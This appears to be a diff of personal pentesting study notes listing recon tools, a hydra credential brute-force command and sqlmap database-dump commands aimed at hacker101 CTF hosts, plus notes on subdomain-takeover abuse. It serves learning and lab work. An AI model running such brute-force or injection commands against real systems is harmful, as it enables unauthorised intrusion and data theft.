@@ -26,7 +26,7 @@ Learning
 
 TODO:
 	vulnweb.com # labs
-COmplete after 3 labs:
+Complete after 3 labs:
 	https://portswigger.net/web-security/authentication/password-based
 
 
@@ -42,7 +42,7 @@ Kali-menu > password profiling worklist
 	httpprobe
 	httpx
 	gobuster
-	fuff command
+	ffuf command
 	anew
 	meg or fff # tool for fetching lot of URL and nice to servers
 
@@ -71,7 +71,7 @@ Kali-menu > password profiling worklist
 	hydra [-l login| -L file]  [-p pass| -P password] [-u] [-f] [IP address][-s PORT] [Module: remote-http] [module-setting]
 	e.g.
 		
-	sudo hydra -L 10k-usernames.txt -P password-biglist.txt -u -f  801792902472a746ea6a94e81c370387.ctf.hacker101.com  https-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V -t 64
+	sudo hydra -L 10k-usernames.txt -P password-biglist.txt -u -f  801792902472a746ea6a94e81c370387.ctf.hacker101.com  https-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V -t 64 -I
 
 	
 	ffuf
@@ -191,6 +191,7 @@ https://securityidiots.com/
 sqlmap "http://example.com/page.php?id=1" --dbs # enumerate databases
 sqlmap -u "http://example.com/page.php?id=1" --D <DB-NAME> --tables # iterate tables names
 sqlmap -u "http://example.com/page.php?id=1" --D <DB-NAME> --dump # iterate tables names
+`sqlmap -u https://2bc4eae9ce149b2c788ef88e1ea52093.ctf.hacker101.com/login  --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --regexp "Invalid password" --level 2 --dump --random-agent`
 ### Sqlite injection
 Flat files db are used for small db. Some sqlite commands are
 `PRAGMA table_info(<table-name>)`, `.tables`
@@ -451,7 +452,6 @@ https://0xpatrik.com/subdomain-takeover-ns/
 - CSP: This header is particularly useful if one wants to minimise the impact of cross-site scripting. If your subdomain is included in the whitelist, you can use your subdomain to bypass the policy and execute malicious client-side code on the application.
 - clickjacking
 - password managers filling form in subdomain and hence getting the creds
-- 
 
 
 ## Session fixation
@@ -470,7 +470,14 @@ Go to different path traversal payload
 
 
 
+### AWS read for ec2 related stuff.
+https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/burstable-credits-baseline-concepts.html#CPU-credit-earn-rate
 
+https://aws.amazon.com/ec2/instance-types/
+
+https://aws.amazon.com/ec2/instance-types/
+
+telnet 50.18.130.223 22
 
 		
 
